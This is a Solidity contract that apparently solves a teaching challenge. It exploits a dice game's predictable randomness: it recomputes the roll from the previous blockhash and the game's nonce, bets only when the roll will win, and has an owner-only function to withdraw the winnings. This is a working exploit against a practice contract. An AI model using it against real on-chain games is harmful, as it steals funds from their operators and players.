pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

//import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) payable {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address payable _addr, uint256 _amount) public onlyOwner {
        (bool success, ) = _addr.call{value: _amount}("");
        require(success, "Fail sent ether");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        require(
            address(this).balance >= .002 ether,
            "no enough ether in this contract"
        );

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
        );
        uint256 roll = uint256(hash) % 16;

        if (roll <= 2) {
            // Success roll
            diceGame.rollTheDice{value: 0.002 ether}();
            // console.log("Success roll", roll);
        } else {
            // console.log("Fail roll", roll);
            require(false, "Fail roll, reverted");
        }
    }

    function getBlockNumber() public view returns (uint256) {
        return block.number;
    }

    function getDiceGamePrize() public view returns (uint256) {
        return diceGame.prize();
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {}
}
